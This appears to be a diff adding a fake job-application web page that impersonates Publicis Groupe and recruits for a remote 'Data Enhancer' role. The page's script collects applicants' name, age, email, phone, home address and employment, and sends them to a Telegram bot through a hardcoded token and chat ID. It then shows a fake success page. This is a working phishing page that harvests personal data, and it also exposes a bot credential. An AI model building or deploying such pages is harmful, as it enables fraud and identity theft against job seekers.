@@ -1,0 +1,98 @@
+
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Publicis Groupe Remote Work Application</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css">
+  <script src="https://cdn.jsdelivr.net/npm/flatpickr"></script>
+  <style>
+    body {font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px;}
+    .container {max-width: 800px; margin: auto; background: #fff; padding: 30px; box-shadow: 0 0 10px rgba(0,0,0,0.1);}
+    h2 {text-align: center;}
+    label {display: block; margin-top: 15px; font-weight: bold;}
+    input, textarea, select {width: 100%; padding: 8px; margin-top: 5px;}
+    .btn {margin-top: 20px; padding: 10px 20px; background: #007bff; color: #fff; border: none; cursor: pointer; font-size: 16px;}
+    .logo {width: 200px; display: block; margin: auto;}
+  </style>
+</head>
+<body>
+  <div class="container" id="formContainer">
+    <img class="logo" src="Logo.png" alt="Publicis Groupe Logo" />
+    <h2>Publicis Groupe Remote Work Application</h2>
+
+    <form id="applicationForm">
+      <label>Position Applied For: <input type="text" value="Data Enhancer" readonly></label>
+      <label>Full Name: <input type="text" id="fullName" required></label>
+      <label>Age: <input type="number" id="age" required></label>
+      <label>Email Address: <input type="email" id="email" required></label>
+      <label>Phone Number: <input type="tel" id="phone" required></label>
+      <label>Residential Address: <input type="text" id="address" required></label>
+      <label>Current Job: <input type="text" id="currentJob"></label>
+      <label>Preferred Start Date: <input type="text" id="startDate" required></label>
+
+      <button type="button" class="btn" onclick="submitForm()">Submit</button>
+    </form>
+  </div>
+
+<script>
+  flatpickr("#startDate", { dateFormat: "Y-m-d" });
+
+  function submitForm() {
+    const name = document.getElementById("fullName").value;
+    const age = document.getElementById("age").value;
+    const email = document.getElementById("email").value;
+    const phone = document.getElementById("phone").value;
+    const address = document.getElementById("address").value;
+    const currentJob = document.getElementById("currentJob").value;
+    const startDate = document.getElementById("startDate").value;
+
+    const message = `
+申请信息：
+姓名：${name}
+年龄：${age}
+邮箱：${email}
+电话：${phone}
+地址：${address}
+当前工作：${currentJob}
+期望开始日期：${startDate}
+    `;
+
+    const token = "8137953882:AAEI_rqRkue1BqwYFl_hm4xfdiWQUIZhsgw";
+    const chat_id = "1469322043";
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+    fetch(url, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({
+        chat_id: chat_id,
+        text: message
+      })
+    }).then(() => {
+      showSuccessPage(name, age, email, phone, address, currentJob, startDate);
+    }).catch(err => {
+      alert("提交失败，请检查网络连接。");
+      console.error(err);
+    });
+  }
+
+  function showSuccessPage(name, age, email, phone, address, currentJob, startDate) {
+    document.body.innerHTML = `
+      <div class="container">
+        <img class="logo" src="Logo.png" alt="Publicis Groupe Logo" />
+        <h2>Application Successful</h2>
+        <p><strong>Name:</strong> ${name}</p>
+        <p><strong>Age:</strong> ${age}</p>
+        <p><strong>Email:</strong> ${email}</p>
+        <p><strong>Phone:</strong> ${phone}</p>
+        <p><strong>Address:</strong> ${address}</p>
+        <p><strong>Current Job:</strong> ${currentJob}</p>
+        <p><strong>Preferred Start Date:</strong> ${startDate}</p>
+      </div>
+    `;
+  }
+</script>
+</body>
+</html>
